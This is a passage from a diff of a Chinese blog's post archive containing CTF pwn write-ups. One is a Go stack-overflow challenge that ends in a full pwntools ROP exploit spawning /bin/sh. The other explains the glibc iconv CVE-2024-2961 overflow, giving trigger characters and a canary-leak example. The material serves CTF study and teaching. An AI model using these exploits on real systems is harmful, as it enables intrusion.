+<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
+                      class=""
+                >
+
+<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
+                      class=""
+                >
+
+<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
+                      class=""
+                >
+
+<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
+                      class=""
+                >
+
+<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
+                      class=""
+                >
+
+<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>go</tag>
+        <tag>ciscn wp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>house_of_force</title>
     <url>/blog/2024/10/03/house-of-force/</url>
     <content><![CDATA[<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
@@ -805,136 +935,6 @@
         <tag>pwn</tag>
         <tag>heap</tag>
         <tag>house of</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2024-2961</title>
-    <url>/blog/2024/09/21/CVE-2024-2961/</url>
-    <content><![CDATA[<h2 id="iconv-cve-2024-2961"><a href="#iconv-cve-2024-2961" class="headerlink" title="iconv-cve-2024-2961"></a>iconv-cve-2024-2961</h2><h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
-<h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 |		溢出内容		|		原UTF-8表示</span><br><span class="line">劄  		$*H [24 2A 48]      	  \xe5\x8a\x84</span><br><span class="line">䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a</span><br><span class="line">峛  		$*H [24 2A 48]			  \xe5\xb3\x9b</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h4><p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc&#x2F;iconvdata&#x2F;iso-2022-cn-ext.c中查看</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ESC	0x1b</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line">...........................................................</span><br><span class="line"><span class="comment">/* See whether we have to emit an escape sequence.  */</span>		      </span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">set</span> != used)						      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    <span class="comment">/* First see whether we announced that we use this		      </span></span><br><span class="line"><span class="comment">	       character set.  */</span>					      </span><br><span class="line">	    <span class="keyword">if</span> ((used &amp; SO_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; <span class="number">8</span>))	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">									      </span><br><span class="line">		assert (used &gt;= <span class="number">1</span> &amp;&amp; used &lt;= <span class="number">4</span>);			      </span><br><span class="line">		escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;			      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SO_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS2_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert (used == CNS11643_2_set); <span class="comment">/* XXX */</span>		      </span><br><span class="line">		escseq = <span class="string">&quot;*H&quot;</span>;						      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS3_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert ((used &gt;&gt; <span class="number">5</span>) &gt;= <span class="number">3</span> &amp;&amp; (used &gt;&gt; <span class="number">5</span>) &lt;= <span class="number">7</span>);		      </span><br><span class="line">		escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;		      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="keyword">if</span> (used == CNS11643_2_set)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS2_0;					      </span><br><span class="line">		*outptr++ = SS2_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS3_0;					      </span><br><span class="line">		*outptr++ = SS3_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span>							      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="comment">/* We only have to emit something if currently ASCII is	      </span></span><br><span class="line"><span class="comment">		   selected.  Otherwise we are switching within the	      </span></span><br><span class="line"><span class="comment">		   SO charset.  */</span>					      </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">set</span> == ASCII_set)					      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    <span class="keyword">if</span> (outptr + <span class="number">1</span> &gt; outend)				      </span><br><span class="line">		      &#123;							      </span><br><span class="line">			result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">			<span class="keyword">break</span>;						      </span><br><span class="line">		      &#125;							      </span><br><span class="line">		    *outptr++ = SO;					      </span><br><span class="line">		  &#125;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="comment">/* Always test the length here since we have used up all the      </span></span><br><span class="line"><span class="comment">	       guaranteed output buffer slots.  */</span>			      </span><br><span class="line">	    <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">		<span class="keyword">break</span>;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	  &#125;								      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">	    <span class="keyword">break</span>;							      </span><br><span class="line">	  &#125;								      </span><br><span class="line">									      </span><br><span class="line">	*outptr++ = buf[<span class="number">0</span>];						      </span><br><span class="line">	*outptr++ = buf[<span class="number">1</span>];						      </span><br><span class="line">	<span class="built_in">set</span> = used;							      </span><br><span class="line">      &#125;									      </span><br><span class="line">									      </span><br><span class="line">    <span class="comment">/* Now that we wrote the output increment the input pointer.  */</span>	      </span><br><span class="line">    inptr += <span class="number">4</span>;								      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
-<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
-<p><strong>set</strong>是当前的字符集标识</p>
-<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
-<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
-<p><strong>outend</strong> 是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
-<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
-<h5 id="三种不同的字符集"><a href="#三种不同的字符集" class="headerlink" title="三种不同的字符集"></a>三种不同的字符集</h5><p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single Shift 3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
-<h6 id="SO-Shift-Out"><a href="#SO-Shift-Out" class="headerlink" title="SO (Shift Out)"></a>SO (Shift Out)</h6><ul>
-<li><strong>用途</strong>: SO（Shift Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
-<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
-<li><strong>作用</strong>: 在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
-</ul>
-<h6 id="SS2-Single-Shift-2"><a href="#SS2-Single-Shift-2" class="headerlink" title="SS2 (Single Shift 2)"></a>SS2 (Single Shift 2)</h6><ul>
-<li><strong>用途</strong>: SS2（Single Shift 2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
-<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
-<li><strong>作用</strong>: 在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
-</ul>
-<h6 id="SS3-Single-Shift-3"><a href="#SS3-Single-Shift-3" class="headerlink" title="SS3 (Single Shift 3)"></a>SS3 (Single Shift 3)</h6><ul>
-<li><strong>用途</strong>: SS3（Single Shift 3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
-<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
-<li><strong>作用</strong>: 类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
-</ul>
-<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    	ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h5 id="实际运行中的-used-及其对应分支"><a href="#实际运行中的-used-及其对应分支" class="headerlink" title="实际运行中的 used 及其对应分支"></a>实际运行中的 used 及其对应分支</h5><p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
-<p>具体哪一个 <code>used</code> 的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
-<ul>
-<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为 <code>GB2312_set</code>（值为1）。</li>
-<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_2_set</code>（值为24）。</li>
-<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_3_set</code>（值为96）。</li>
-</ul>
-<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为 <code>GB2312_set</code>（1），并进入第一个 <code>if</code> 分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code> 将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
-<h5 id="具体执行过程"><a href="#具体执行过程" class="headerlink" title="具体执行过程"></a>具体执行过程</h5><p><strong>1. 检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
-<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
-<p>我们现在详细分析下3个if分支的条件</p>
-<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code>	</p>
-<ul>
-<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p>
-</li>
-<li><p>(ann &amp; SO_ann) !&#x3D; (used &lt;&lt; 8)用于检测是否声明过该字符集</p>
-</li>
-<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p>
-</li>
-</ul>
-<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
-<ul>
-<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
-</ul>
-<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
-<ul>
-<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
-</ul>
-<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">&#123;							      </span><br><span class="line">	result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">	<span class="keyword">break</span>;						     </span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></div>
-
-
-
-<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
-<p><strong>3.生成转义序列</strong>：</p>
-<ul>
-<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
-<li>更新已声明的字符集<code>ann</code>。</li>
-</ul>
-<p><code>escseq</code> 是一个指向字符数组的指针，用于存储转义序列（escape sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *escseq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SO 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS2 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;*H&quot;</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS3 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-
-<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
-<ul>
-<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
-<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC与0x4f的后缀。</li>
-</ul>
-<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr + 1 &lt;&#x3D; outend</strong>，则加入0x0e后缀。</p>
-<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
-<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
-<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
-<h4 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h4><h5 id="XGCTF-echo"><a href="#XGCTF-echo" class="headerlink" title="XGCTF [echo]"></a>XGCTF [echo]</h5><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185742098.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185755294.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185806653.png"
-                      class=""
-                >
-
-<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的\x00给覆盖了，那么printf(“%s”,s)就能直接把canary的值打印出来了。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185814773.png"
-                      class=""
-                >
-
-<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
